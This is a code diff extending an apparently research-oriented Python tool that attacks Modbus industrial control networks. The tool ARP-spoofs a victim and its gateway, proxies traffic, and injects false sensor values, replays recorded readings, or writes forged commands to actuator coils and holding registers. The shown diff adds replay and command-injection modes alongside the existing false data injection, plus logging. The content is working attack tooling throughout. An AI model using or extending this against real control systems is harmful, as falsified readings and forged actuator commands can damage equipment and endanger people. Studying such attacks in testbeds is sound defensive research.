@@ -27,15 +27,25 @@ import time
 from pathlib import Path
 
 from . import arp
-from .handlers import FDIHandler
+from .handlers import CommandHandler, FDIHandler, ReplayHandler
 from .proxy import TransparentProxy
+
+
+def build_handler(a):
+    if a.kind == "fdi":
+        return FDIHandler(func=a.func, address=a.address, mode=a.mode, value=a.value)
+    if a.kind == "replay":
+        return ReplayHandler(func=a.func, address=a.address, window=a.window)
+    if a.kind == "command":
+        return CommandHandler(reg_type=a.reg_type, address=a.address, mode=a.mode, value=a.value)
+    raise ValueError(f"unknown attack kind {a.kind!r}")
 
 
 class Agent:
     def __init__(self, a):
         self.a = a
         self.iface = a.iface or arp.default_iface()
-        self.handler = FDIHandler(func=a.func, address=a.address, mode=a.mode, value=a.value)
+        self.handler = build_handler(a)
         self.proxy = TransparentProxy("0.0.0.0", a.proxy_port, self.handler, log=self._noop)
         self.spoofer: arp.ARPSpoofer | None = None
         self.active = False
@@ -117,14 +127,15 @@ class Agent:
     def _log_init(self):
         if not self.logf.exists():
             with open(self.logf, "w", newline="") as fh:
-                csv.writer(fh).writerow(["wall_time", "event", "victim", "func",
+                csv.writer(fh).writerow(["wall_time", "event", "kind", "victim",
                                          "address", "mode", "value", "hits", "note"])
 
     def _log(self, event, note=""):
         with open(self.logf, "a", newline="") as fh:
-            csv.writer(fh).writerow([round(time.time(), 3), event, self.a.victim_ip,
-                                     self.a.func, self.a.address, self.a.mode,
-                                     self.a.value, self.handler.hits, note])
+            csv.writer(fh).writerow([round(time.time(), 3), event, self.a.kind,
+                                     self.a.victim_ip, self.a.address,
+                                     getattr(self.a, "mode", ""), getattr(self.a, "value", ""),
+                                     self.handler.hits, note])
 
     # ------------------------------------------------------------------ main
     def run(self):
@@ -155,12 +166,17 @@ class Agent:
 def main(argv=None):
     ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--kind", default="fdi", choices=["fdi", "replay", "command"])
     ap.add_argument("--victim-ip", required=True)
     ap.add_argument("--gw-ip", required=True)
-    ap.add_argument("--func", type=int, default=4, choices=[3, 4])
+    ap.add_argument("--func", type=int, default=4, choices=[3, 4],
+                    help="read function code for fdi/replay")
+    ap.add_argument("--reg-type", default="H", choices=["C", "H"],
+                    help="actuator register type for command (C coil, H holding)")
     ap.add_argument("--address", type=int, required=True)
     ap.add_argument("--mode", default="freeze", choices=["const", "offset", "freeze"])
     ap.add_argument("--value", type=float, default=0.0)
+    ap.add_argument("--window", type=int, default=240, help="replay buffer length")
     ap.add_argument("--modbus-port", type=int, default=502)
     ap.add_argument("--proxy-port", type=int, default=7502)
     ap.add_argument("--iface", default="")
